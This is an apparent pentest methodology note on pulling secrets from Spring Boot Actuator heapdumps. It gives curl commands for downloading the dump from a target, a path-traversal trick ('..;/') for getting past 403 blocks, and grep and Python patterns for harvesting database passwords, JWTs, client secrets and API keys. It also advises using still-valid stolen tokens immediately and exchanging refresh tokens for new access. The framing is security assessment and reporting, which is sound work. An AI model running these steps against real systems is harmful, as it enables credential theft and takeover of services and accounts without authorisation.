# Heapdump Secret Extraction

Methodology for extracting credentials, tokens, and configuration from Java HPROF heapdump files obtained via Spring Boot Actuator.

## Obtaining the Heapdump

```bash
# Download (may take 15-60s depending on heap size)
curl -o heapdump.hprof "https://target.com/actuator/heapdump" --max-time 120

# Check size (typical: 10MB-500MB)
ls -lh heapdump.hprof
```

**Common responses:**
- 200 + data → success (Critical finding)
- 504 → timeout (heap too large, try longer `--max-time 300`)
- 403 → blocked (try path traversal: `/context/..;/actuator/heapdump`)
- 404 → endpoint disabled

## Extraction Methods (ordered by effectiveness)

### Method 1: Eclipse MAT (Best for object graph traversal)

```bash
# Install
brew install --cask eclipse-memory-analyzer

# Open heapdump, then:
# 1. OQL query for Spring Environment:
#    SELECT * FROM org.springframework.core.env.MapPropertySource
# 2. Look for "systemProperties" and "systemEnvironment" sources
# 3. Expand to find resolved config values
```

### Method 2: jhat (JDK built-in, good for quick analysis)

```bash
jhat heapdump.hprof
# Opens web UI at http://localhost:7000
# Navigate to: All Classes → search for "Environment" or "DataSource"
```

### Method 3: strings + grep (Fast but incomplete)

```bash
# Basic extraction (misses values in object fields)
strings -n 10 heapdump.hprof | grep -iE "(password|secret|token|jdbc:|redis:|amqp://)" | sort -u

# Search for specific patterns
strings -n 10 heapdump.hprof | grep -oE "eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}"  # JWT
strings -n 10 heapdump.hprof | grep -oE "https?://[a-zA-Z0-9._:-]+/realms/[a-zA-Z0-9_-]+"  # Keycloak URLs
strings -n 10 heapdump.hprof | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"  # UUIDs
```

**IMPORTANT:** `strings` alone is INSUFFICIENT for Java heapdumps. Resolved Spring config values are stored in Java object fields (char arrays inside String objects inside PropertySource maps). They won't appear as contiguous ASCII strings. Use Eclipse MAT or the Python method below for thorough extraction.

### Method 4: Python binary search (middle ground)

```python
import re

with open('heapdump.hprof', 'rb') as f:
    data = f.read()

# Search for URLs
urls = set(re.findall(rb'https?://[a-zA-Z0-9._:-]+/[a-zA-Z0-9/_.-]*', data))

# Search for JWTs
jwts = set(re.findall(rb'eyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}', data))

# Search for connection strings
jdbc = set(re.findall(rb'jdbc:[a-zA-Z0-9]+://[^\x00\x01\x02]{10,100}', data))
redis = set(re.findall(rb'redis://[^\x00\x01\x02]{10,80}', data))
amqp = set(re.findall(rb'amqp://[^\x00\x01\x02]{10,80}', data))

# Search for Spring property names (reveals what config exists)
props = set(re.findall(rb'setting\.[a-zA-Z0-9._-]+', data))

# Search for Keycloak realm URLs
realms = set(re.findall(rb'https?://[a-zA-Z0-9._:-]+/realms/[a-zA-Z0-9_-]+', data))
```

### Method 5: heapdump_tool (purpose-built)

```bash
# https://github.com/wyzxxz/heapdump_tool
java -jar heapdump_tool.jar heapdump.hprof
# Automatically extracts: passwords, tokens, URLs, Spring config
```

## What to Search For

### High-Value Targets

| Target | Pattern | Severity if Found |
|--------|---------|-------------------|
| Database passwords | `jdbc:`, `spring.datasource.password` | Critical |
| Keycloak client secrets | `client_secret`, `clientSecret` | Critical |
| JWT signing keys | `jwt.secret`, `signing-key` | Critical |
| Service account tokens | `eyJ...` (JWT), UUID refresh tokens | Critical |
| API keys | `apiKey`, `api_key`, `SNYK_TOKEN`, `GITHUB_TOKEN` | High |
| Redis/RabbitMQ passwords | `redis://`, `amqp://`, `spring.redis.password` | High |
| Internal URLs | `*.svc.cluster.local`, `microservices-private.*` | Medium |
| Feature flags | `setting.feature.config.*` | Low-Medium |

### Spring Property Names (reveals architecture even without values)

```bash
strings -n 10 heapdump.hprof | grep -oE "setting\.[a-zA-Z0-9._-]+" | sort -u
# or
strings -n 10 heapdump.hprof | grep -oE "spring\.[a-zA-Z0-9._-]+" | sort -u
```

These property names reveal:
- All microservice integrations (`setting.*.microservices.rootUrl`)
- Feature flags (`setting.feature.config.*`)
- Queue bindings (`setting.queue.binding.*`)
- Third-party integrations (`setting.tongdun.*`, `setting.yellowAi.*`)

## Lessons from Real Engagements

1. **`strings` finds property NAMES but not VALUES**: Spring stores resolved values in `char[]` fields inside `String` objects inside `HashMap$Node` entries. The key and value are separate objects in memory — `strings` finds them independently but can't correlate them.

2. **Token validity**: Tokens extracted from heapdumps may be:
   - Still valid (if within TTL) → use immediately
   - Expired but refresh token works → exchange for new access token
   - Invalidated (session ended) → proves the pattern but can't use directly

3. **Service account tokens are most valuable**: Unlike user tokens (short-lived), service account tokens often have longer TTLs and higher privileges (realm-admin, impersonation).

4. **Heapdump size vs timeout**: Large heaps (>100MB) may timeout on the first request. Try:
   - Longer timeout (`--max-time 300`)
   - Resume download (`curl -C -`)
   - Multiple attempts (GC may reduce heap between requests)

5. **The heapdump itself is the finding**: Even if you can't extract usable credentials, a downloadable heapdump is Critical because:
   - It WILL contain secrets (Spring stores all config in memory)
   - A more skilled attacker with Eclipse MAT WILL extract them
   - The endpoint should never be exposed

## Reporting

```markdown
## [FINDING-N] Downloadable JVM Heapdump (Credential Extraction)

**Severity:** Critical
**CVSS 3.1:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

### What was extracted:
- Service account token: {user} (role: {role})
- Spring config properties: {count} settings revealed
- Internal URLs: {list}
- Database type: {PostgreSQL/MySQL/etc}

### What could be extracted with deeper analysis:
- Database passwords (in Spring DataSource objects)
- JWT signing keys (in SecurityConfig objects)
- All API keys and client secrets
```
